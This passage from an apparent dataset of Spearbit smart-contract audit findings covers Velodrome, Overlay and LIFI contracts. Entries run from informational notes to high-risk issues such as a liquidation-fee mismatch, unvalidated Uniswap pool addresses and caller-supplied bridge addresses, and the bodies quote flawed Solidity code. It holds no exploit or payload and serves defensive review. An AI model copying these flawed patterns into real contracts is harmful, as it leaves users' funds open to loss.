            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Allow Manual Suggestion of Pair in AutoCompounder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Allow manual suggestion of token pairs such as USDC, USDT, LUSD, and wBTC. It may be best to pass a list of pairs as parameters to check for additional tokens. Ultimately, if a suggested pair offers a better price, there's no reason not to allow it. The caller should be able to pass a suggested optimal route, which can then be compared against other routes. Use whichever route is best. If the user's suggested route is the best one, use theirs and ensure that the swap goes through.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check if owner exists in split function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In case the NFT does not exist, the _ownerOf(_from) function returns the zero address. This check is satisfied if canSplit has been toggled. However, this does not lead to any issues because the _- isApprovedOrOwner() check will revert as intended, and there is no amount in the lock. It may be a good idea to update the _ownerOf() function to revert if there is no owner for the NFT.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Velo and Veto Governor do not use MetaTX Context",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "These two contracts use Context instead of ERC2771Context.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "SinkManager is depositing to Gauge without using the TokenId",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "gauge.deposit allows to specify a tokenId, but the field is unused",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use unchecked in TickMath.sol and FullMath.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Uniswap math libraries rely on wrapping behaviour for conducting arithmetic operations. Solidity version 0.8.0 introduced checked arithmetic by default where operations that cause an overflow would revert. Since the code was adapted from Uniswap and written in Solidity version 0.7.6, these arithmetic operations should be wrapped in an unchecked block.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Liquidation might fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The liquidate() function checks if a position can be liquidated and via liquidatable(), uses maintenanceMarginFraction as a factor to determine if enough value is left. However, in the rest of the liqui- date() function liquidationFeeRate is used to determine the fee paid to the liquidator. It is not necessarily true that enough value is left for the fee, as two different ways are used to calculate this which means that positions might be liquidated. This is classified as high risk because liquidation is an essential functionality of Overlay. contract OverlayV1Market is IOverlayV1Market { function liquidate(address owner, uint256 positionId) external { ... require(pos.liquidatable(..., maintenanceMarginFraction),\"OVLV1:!liquidatable\"); ... uint256 liquidationFee = value.mulDown(liquidationFeeRate); ... ovl.transfer(msg.sender, value - liquidationFee); ovl.transfer(IOverlayV1Factory(factory).feeRecipient(), liquidationFee); } } library Position { function liquidatable(..., uint256 maintenanceMarginFraction) ... { ... uint256 maintenanceMargin = posNotionalInitial.mulUp(maintenanceMarginFraction); can_ = val < maintenanceMargin; } } 4",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Rounding down of snapAccumulator might influence calculations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function transform() lowers snapAccumulator with the following equation: (snapAccumulator * int256(dt)) / int256(snapWindow). During the time that snapAccumulator * dt is smaller than snapWindow this will be rounded down to 0, which means snapAccumulator will stay at the same value. Luckily, dt will eventually reach the value of snapWindow and by then the value wont be rounded down to 0 any more. Risk lies in calculations diverging from formulas written in the whitepaper. Note: Given medium risk severity because the probability of this happening is high, while impact is likely low. function transform(...) ... { ... snapAccumulator -= (snapAccumulator * int256(dt)) / int256(snapWindow); ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Verify pool legitimacy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The constructor in OverlayV1UniswapV3Factory.sol and OverlayV1UniswapV3Feed.sol only does a partial check to see if the pool corresponds to the supplied tokens. This is accomplished by calling the pools functions but if the pool were to be malicious, it could return any token. Additionally, checks can be by- passed by supplying the same tokens twice. Because the deployFeed() function is permissionless, it is possible to deploy malicious feeds. Luckily, the de- ployMarket() function is permissioned and prevents malicious markets from being deployed. contract OverlayV1UniswapV3Factory is IOverlayV1UniswapV3FeedFactory, OverlayV1FeedFactory { constructor(address _ovlWethPool, address _ovl, ...) { ovlWethPool = _ovlWethPool; // no check on validity of _ovlWethPool here ovl = _ovl; } function deployFeed(address marketPool, address marketBaseToken, address marketQuoteToken, ...) external returns (address feed_) { // Permissionless ... // no check on validity of marketPool here } 5 } contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { constructor( address _marketPool, address _ovlWethPool, address _ovl, address _marketBaseToken, address _marketQuoteToken, ... ) ... { ... address _marketToken0 = IUniswapV3Pool(_marketPool).token0(); // relies on a valid _marketPool address _marketToken1 = IUniswapV3Pool(_marketPool).token1(); require(_marketToken0 == WETH || _marketToken1 == WETH, \"OVLV1Feed: marketToken != WETH\"); marketToken0 = _marketToken0; marketToken1 = _marketToken1; require( _marketToken0 == _marketBaseToken || _marketToken1 == _marketBaseToken, \"OVLV1Feed: marketToken != marketBaseToken\" ); require( _marketToken0 == _marketQuoteToken || _marketToken1 == _marketQuoteToken, \"OVLV1Feed: marketToken != marketQuoteToken\" ); marketBaseToken = _marketBaseToken; // what if _marketBaseToken == _marketQuoteToken == WETH ? marketQuoteToken = _marketQuoteToken; marketBaseAmount = _marketBaseAmount; // need OVL/WETH pool for ovl vs ETH price to make reserve conversion from ETH => OVL address _ovlWethToken0 = IUniswapV3Pool(_ovlWethPool).token0(); // relies on a valid ,! _ovlWethPool address _ovlWethToken1 = IUniswapV3Pool(_ovlWethPool).token1(); require( _ovlWethToken0 == WETH || _ovlWethToken1 == WETH, \"OVLV1Feed: ovlWethToken != WETH\" ); require( _ovlWethToken0 == _ovl || _ovlWethToken1 == _ovl, // What if _ovl == WETH ? \"OVLV1Feed: ovlWethToken != OVL\" ); ovlWethToken0 = _ovlWethToken0; ovlWethToken1 = _ovlWethToken1; marketPool = _marketPool; ovlWethPool = _ovlWethPool; ovl = _ovl; }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Liquidatable positions can be unwound by the owner of the position",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The liquidation function can be front-runned since it does not require any deposits. In particular, the liquidation function can be front-runned by the owner of the position by calling unwind. This effectively means that users can prevent themselves from getting liquidated by watching the mempool and frontrunning calls to their liquidation position by calling unwind. Although this behaviour is similar to liquidations in lending protocols where a borrower can front-run a liquidation by repaying the borrow, the lack of collateral requirements for both unwind and liquidation makes this case special. Note: In practice, transactions for liquidations do not end up in the public mempool and are often sent via private relays such as flashbots. Therefore, a scenario where the user finds out about a liquidatable position by the public mempool is likely not common. However, a similar argument still applies. Note: Overlay also allows the owner of the position to be the liquidator, unlike other protocols like compound. The difference in price computation for the liquidation and unwind mechanism may make it better for users to liquidate themselves rather than unwinding their position. However, a check similar to compound is not effective at preventing this issue since users can always liquidate themselves from another address.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Adding constructor params causes creation code to change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Using constructor parameters in create2 makes the construction code different for every case. This makes address calculation more complex as you first have to calculate the construction code, hash it and then do address calculation. Whats worse is that Etherscan does not properly support auto-verification of contracts deployed via create2 with different creation code. Youll have to manually verify all markets individually. Additionally, needless salt in OverlayV1Factory.sol#L129.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential wrap of timestamp",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "In the transform() function, a revert could occur right after timestamp32 has wrapped (e.g. when timestamp > 2**32). function transform(... , uint256 timestamp, ...) ... { uint32 timestamp32 = uint32(timestamp % 2**32); // mod to fit in uint32 ... uint256 dt = uint256(timestamp32 - self.timestamp); // could revert if timestamp32 has just wrapped ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify the validity of _microWindow and _macroWindow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The constructor of OverlayV1Feed doesnt verify the validity of _microWindow and _macroWindow, potentially causing the price oracle to produce bad results if misconfigured. constructor(uint256 _microWindow, uint256 _macroWindow) { microWindow = _microWindow; macroWindow = _macroWindow; }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Simplify _midFromFeed()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The calculation in _midFromFeed() is more complicated than necessary because: min(x,y) + max(x,y) == x + y. More importantly, the average operation (bid + ask) / 2 can overflow and revert if bid + ask >= 2**256. function _midFromFeed(Oracle.Data memory data) private view returns (uint256 mid_) { uint256 bid = Math.min(data.priceOverMicroWindow, data.priceOverMacroWindow); uint256 ask = Math.max(data.priceOverMicroWindow, data.priceOverMacroWindow); mid_ = (bid + ask) / 2; }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use implicit truncation of timestamp",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Solidity will truncate data when it is typecast to a smaller data type, see solidity explicit-conversions. This can be used to simplify the following statement: uint32 timestamp32 = uint32(timestamp % 2**32); // mod to fit in uint32",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Set pos.entryPrice to 0 after liquidation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The liquidate() function sets most of the values of pos to 0, with the exception of pos.entryPrice. function liquidate(address owner, uint256 positionId) external { ... // store the updated position info data. mark as liquidated pos.notional = 0; pos.debt = 0; pos.oiShares = 0; pos.liquidated = true; positions.set(owner, positionId, pos); ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Store result of expression in temporary variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Several gas optimizations are possible by storing the result of an expression in a temporary variable, such as the value of oiFromNotional(data, capNotionalAdjusted). 10 function build( ... ) { ... uint256 price = isLong ? ask(data, _registerVolumeAsk(data, oi, oiFromNotional(data, capNotionalAdjusted))) : bid(data, _registerVolumeBid(data, oi, oiFromNotional(data, capNotionalAdjusted))); ... require(oiTotalOnSide <= oiFromNotional(data, capNotionalAdjusted), \"OVLV1:oi>cap\"); }  A: The value of pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) could be stored in a temporary variable to save gas.  B: The value of oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) could also be stored in a temporary variable to save gas and make the code more readable.  C: The value of pos.oiSharesCurrent(fraction) could be stored in a temporary variable to save gas. function unwind(...) ... { ... uint256 price = pos.isLong ? bid( data, _registerVolumeBid( data, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide), // A1 oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) // B1 ) ) : ask( data, _registerVolumeAsk( data, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide), // A2 oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) // B2 ) ); ... if (pos.isLong) { oiLong -= Math.min( oiLong, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) // A3 ); oiLongShares -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); // C1 } else { oiShort -= Math.min( oiShort, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) // A4 ); oiShortShares -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); // C2 } ... pos.oiShares -= Math.min(pos.oiShares, pos.oiSharesCurrent(fraction)); // C3 } The value of 2 * k * timeElapsed could also be stored in a temporary variable: 11 function oiAfterFunding( ...) ... { ... if (2 * k * timeElapsed < MAX_NATURAL_EXPONENT) { fundingFactor = INVERSE_EULER.powDown(2 * k * timeElapsed); }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Flatten code of OverlayV1UniswapV3Feed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Functions _fetch(), _inputsToConsultMarketPool(), _inputsToConsultOvlWethPool() and con- sult() do a lot of interactions with small arrays and loops over them, increasing overhead and reading difficulty.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Replace memory with calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "External calls to functions with memory parameters can be made more gas efficient by replacing memory with calldata, as long as the memory parameters are not modified.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "No need to cache immutable values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Variables microWindow and macroWindow are immutable, so it is not necessary to cache them because the compiler inlines their value. contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { function _fetch() internal view virtual override returns (Oracle.Data memory) { // cache micro and macro windows for gas savings uint256 _microWindow = microWindow; uint256 _macroWindow = macroWindow; ... } } abstract contract OverlayV1Feed is IOverlayV1Feed { ... uint256 public immutable microWindow; uint256 public immutable macroWindow; ... constructor(uint256 _microWindow, uint256 _macroWindow) { microWindow = _microWindow; macroWindow = _macroWindow; } }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify circuitBreaker",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function circuitBreaker() does a divDown() which can be circumvented to save gas and improving readability. function circuitBreaker(Roller.Snapshot memory snapshot, uint256 cap) ... { ... if (minted <= int256(_circuitBreakerMintTarget)) { return cap; } else if (uint256(minted).divDown(_circuitBreakerMintTarget) >= 2 * ONE) { return 0; } ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimizations if data.macroWindow is constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Several checks are done in contract OverlayV1Market which involve data.macroWindow in combi- nation with a linear calculation. If data.macroWindow does not change (as is the case with the UniswapV3 feed), it is possible to optimize the calculations by precalculating several values.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Remove unused / redundant functions and variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Functions nextPositionId() and mid() in OverlayV1Market.sol are not used internally and dont appear to be useful. contract OverlayV1Market is IOverlayV1Market { function nextPositionId() external view returns (uint256) { return _totalPositions; } function mid(Oracle.Data memory data,uint256 volumeBid,uint256 volumeAsk) ... { ... } } The functions oiInitial() and oiSharesCurrent() in library Position.sol have the same implementation. The oiInitial() function does not seem useful as it retrieves current positions and not initial ones. library Position { /// @notice Computes the initial open interest of position when built ... function oiInitial(Info memory self, uint256 fraction) internal pure returns (uint256) { return _oiShares(self).mulUp(fraction); } /// @notice Computes the current shares of open interest position holds ... function oiSharesCurrent(Info memory self, uint256 fraction) internal pure returns (uint256) { return _oiShares(self).mulUp(fraction); } } 15 The function liquidationPrice() in library Position.sol is not used from the contracts. Because it type is internal it cannot be called from the outside either. library Position { function liquidationPrice(... ) internal pure returns (uint256 liqPrice_) { ... } } The variables ovlWethToken0 and ovlWethToken1 are stored but not used anymore. constructor(..., address _ovlWethPool,...) .. { ... // need OVL/WETH pool for ovl vs ETH price to make reserve conversion from ETH => OVL address _ovlWethToken0 = IUniswapV3Pool(_ovlWethPool).token0(); address _ovlWethToken1 = IUniswapV3Pool(_ovlWethPool).token1(); ... ovlWethToken0 = _ovlWethToken0; ovlWethToken1 = _ovlWethToken1; ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization OverlayV1Market.sol#L536-L539,"
        ]
    },
    {
        "title": "Optimize power functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "In contract OverlayV1Market.sol, several power calculations are done with EULER / INVERSE_EULER as a base which can be optimized to save gas. function dataIsValid(Oracle.Data memory data) public view returns (bool) { ... uint256 dpLowerLimit = INVERSE_EULER.powUp(pow); uint256 dpUpperLimit = EULER.powUp(pow); ... } Note: As the Overlay team confirmed, less precision might be sufficient for this calculation. OverlayV1Market.sol: fundingFactor = INVERSE_EULER.powDown(2 * k * timeElapsed); OverlayV1Market.sol: bid_ = bid_.mulDown(INVERSE_EULER.powUp(pow)); OverlayV1Market.sol: ask_ = ask_.mulUp(EULER.powUp(pow)); 16",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant Math.min()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function capNotionalAdjustedForCircuitBreaker() calculates circuitBreaker() and then does a Math.min(cap,...) with the result. However circuitBreaker() already returns a value that is <= cap. So the Math.min(...) function is unnecesary. 17 function capNotionalAdjustedForCircuitBreaker(uint256 cap) public view returns (uint256) { ... cap = Math.min(cap, circuitBreaker(snapshot, cap)); return cap; } function circuitBreaker(Roller.Snapshot memory snapshot, uint256 cap) public view returns (uint256) { ... if (minted <= int256(_circuitBreakerMintTarget)) { return cap; } else if (...) { return 0; } // so minted > _circuitBreakerMintTarget, thus minted / _circuitBreakerMintTarget > ONE ... uint256 adjustment = 2 * ONE - uint256(minted).divDown(_circuitBreakerMintTarget); // so adjustment <= ONE return cap.mulDown(adjustment); // so this is <= cap }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Replace square with multiplication",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The contract OverlayV1Market.sol contains the following expression several times: x.powDown(2 * ONE). This computes the square of x. However, it can also be calculated in a more gas efficient way: function oiAfterFunding(...) { ... uint256 underRoot = ONE - oiImbalanceBefore.divDown(oiTotalBefore).powDown(2 * ONE).mulDown( ONE - fundingFactor.powDown(2 * ONE) ); ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Retrieve roles via constants in import",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Within contract OverlayV1Factory.sol, the roles GOVERNOR_ROLE, MINTER_ROLE, BURNER_ROLE are retrieved via an external function call. To save gas they could also be retrieved as constants via import. Additionally, a role ADMIN_ROLE is defined in contract OverlayV1Token.sol, which is the same as DEFAULT_ADMIN_- ROLE of AccessControl.sol. This ADMIN_ROLE could be replaced with DEFAULT_ADMIN_ROLE. modifier onlyGovernor() { - + require(ovl.hasRole(ovl.GOVERNOR_ROLE(), msg.sender), \"OVLV1: !governor\"); require(ovl.hasRole(GOVERNOR_ROLE, msg.sender), \"OVLV1: !governor\"); _; } ... function deployMarket(...) { ... ovl.grantRole(ovl.MINTER_ROLE(), market_); ovl.grantRole(MINTER_ROLE, market_); ovl.grantRole(ovl.BURNER_ROLE(), market_); ovl.grantRole(BURNER_ROLE, market_); ... - + - + }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Double check action when snapAccumulator == 0 in transform()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function transform() does a check for snapAccumulator + value == 0 (where all variables are of type int256). This could be true if value == -snapAccumulator (or snapAccumulator == value == 0) A comment shows this is to prevent division by 0 later on. The division is based on abs(snapAccumulator) + abs(value). So this will only fail when snapAccumulator == value == 0. function transform(...) ... { ... int256 accumulatorNow = snapAccumulator + value; if (accumulatorNow == 0) { // if accumulator now is zero, windowNow is simply window // to avoid 0/0 case below return ... ---> this comment might not be accurate } ... uint256 w1 = uint256(snapAccumulator >= 0 ? snapAccumulator : -snapAccumulator); // w1 = abs(snapAccumulator) uint256 w2 = uint256(value >= 0 ? value : -value); uint256 windowNow = (w1 * (snapWindow - dt) + w2 * window) / (w1 + w2); // only fails if w1 == w2 == 0 ... // w2 = abs(value) ,! ,! }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add unchecked in natural log (ln) function or remove the functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function ln() in contract LogExpMath.sol does not use unchecked, while the function log() does. Note: Neither ln() nor log() are used, so they could also be deleted. function log(int256 arg, int256 base) internal pure returns (int256) { unchecked { ... } } function ln(int256 a) internal pure returns (int256) { // no unchecked }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Specialized functions for the long and short side",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The functions build(), unwind() and liquidate() contain a large percentage of code that is differ- ent for the long and short side.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Beware of chain dependencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The contracts have a few dependencies/assumptions which arent future proof and/or limit on which chain the code can be deployed. The AVERAGE_BLOCK_TIME is different on several EVM based chains. As the the Ethereum mainchain, the AVER- AGE_BLOCK_TIME will change to 12 seconds after the merge. contract OverlayV1Market is IOverlayV1Market { ... uint256 internal constant AVERAGE_BLOCK_TIME = 14; // (BAD) TODO: remove since not futureproof ... } WETH addresses are not the same on different chains. See Uniswap Wrapped Native Token Addresses. Note: Several chains have a different native token instead of ETH. 21 contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move _registerMint() closer to mint() and burn()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Within functions unwind() and liquidate() there is a call to _registerMint() as well as calls to ovl.mint() and ovl.burn(). However these two are quite a few lines apart so it is not immediately obvious they are related and operate on the same values. Additionally _registerMint() also registers burns. function unwind(...) ... { ... _registerMint(int256(value) - int256(cost)); ... // 40 lines of code if (value >= cost) { ovl.mint(address(this), value - cost); } else { ovl.burn(cost - value); } ... } function liquidate(address owner, uint256 positionId) external { ... _registerMint(int256(value) - int256(cost)); ... // 33 lines of code ovl.burn(cost - value); ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of Math.min() is error-prone",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Function Math.min() is used in two ways:  To get the smallest of two values, e.g. x = Math.min(x,y);  To make sure the resulting value is >=0, e.g. x -= Math.min(x,y); (note, there is an extra - in -= ) It is easy to make a mistake because both constructs are rather similar. Note: No mistakes have been found in the code. Examples to get the smallest of two values: OverlayV1Market.sol: tradingFee OverlayV1Market.sol: cap OverlayV1Market.sol: cap = Math.min(tradingFee, value); = Math.min(cap, circuitBreaker(snapshot, cap)); = Math.min(cap, backRunBound(data)); Examples to make sure the resulting value is >=0: OverlayV1Market.sol: oiLong -= Math.min(oiLong,pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiLongShares OverlayV1Market.sol: oiShort oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiShortShares OverlayV1Market.sol: pos.notional OverlayV1Market.sol: pos.debt OverlayV1Market.sol: pos.oiShares OverlayV1Market.sol: oiLong oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiLongShares OverlayV1Market.sol: oiShort oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiShortShares Position.sol: posCost -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiShort,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); -= uint120( Math.min(pos.notional, pos.notionalInitial(fraction))); -= uint120( Math.min(pos.debt, pos.debtCurrent(fraction))); -= Math.min(pos.oiShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiLong,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiShort,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); -= Math.min(posCost, posDebt);",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Confusing use of term burn",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function oiAfterFunding() contains a comment that it burns a portion of the contracts. The term burn can be confused with burning of OVL. The Overlay team clarified that: The total aggregate open interest outstanding (oiLong + oiShort) on the market decreases over time with funding. Theres no actual burning of OVL. function oiAfterFunding(...) ... { ... // Burn portion of all aggregate contracts (i.e. oiLong + oiShort) // to compensate protocol for pro-rata share of imbalance liability ... return (oiOverweightNow, oiUnderweightNow); }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document precondition for oiAfterFunding()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Function oiAfterFunding contains the following statement: uint256 oiImbalanceBefore = oiOverweightBefore - oiUnderweightBefore; Nevertheless, if oiOverweightBefore < oiUnderweightBefore then statement will revert. Luckily, the update() function makes sure this isnt the case. function oiAfterFunding(uint256 oiOverweightBefore, uint256 oiUnderweightBefore, ...) ... { ... uint256 oiImbalanceBefore = oiOverweightBefore - oiUnderweightBefore; // Could if oiOverweightBefore < oiUnderweightBefore ... } function update() public returns (Oracle.Data memory) { ... bool isLongOverweight = oiLong > oiShort; uint256 oiOverweight two uint256 oiUnderweight = isLongOverweight ? oiShort : the two (oiOverweight, oiUnderweight) = oiAfterFunding(oiOverweight, oiUnderweight, ...); ... = isLongOverweight ? oiLong : oiShort; // oiOverweight is the largest of the oiLong; // oiUnderweight is the smallest of ,! ,! }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Format numbers intelligibly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Solidity offers several possibilities to format numbers in a more readable way as noted below.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Hardcode bridge addresses via immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Most bridge facets call bridge contracts where the bridge address has been supplied as a parameter. This is inherently unsafe because any address could be called. Luckily, the called function signature is hardcoded, which reduces risk. However, it is still possible to call an unexpected function due to the potential collisions of function signatures. Users might be tricked into signing a transaction for the LiFi protocol that calls unexpected contracts. One exception is the AxelarFacet which sets the bridge addresses in initAxelar(), however this is relatively expensive as it requires an SLOAD to retrieve the bridge addresses. Note: also see \"Facets approve arbitrary addresses for ERC20 tokens\". function startBridgeTokensViaOmniBridge(..., BridgeData calldata _bridgeData) ... { ... _startBridge(_lifiData, _bridgeData, _bridgeData.amount, false); } function _startBridge(..., BridgeData calldata _bridgeData, ...) ... { IOmniBridge bridge = IOmniBridge(_bridgeData.bridge); if (LibAsset.isNativeAsset(_bridgeData.assetId)) { bridge.wrapAndRelayTokens{ ... }(...); } else { ... bridge.relayTokens(...); } ... } contract AxelarFacet { function initAxelar(address _gateway, address _gasReceiver) external { ... s.gateway = IAxelarGateway(_gateway); s.gasReceiver = IAxelarGasService(_gasReceiver); } function executeCallViaAxelar(...) ... { ... s.gasReceiver.payNativeGasForContractCall{ ... }(...); s.gateway.callContract(destinationChain, destinationAddress, payload); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
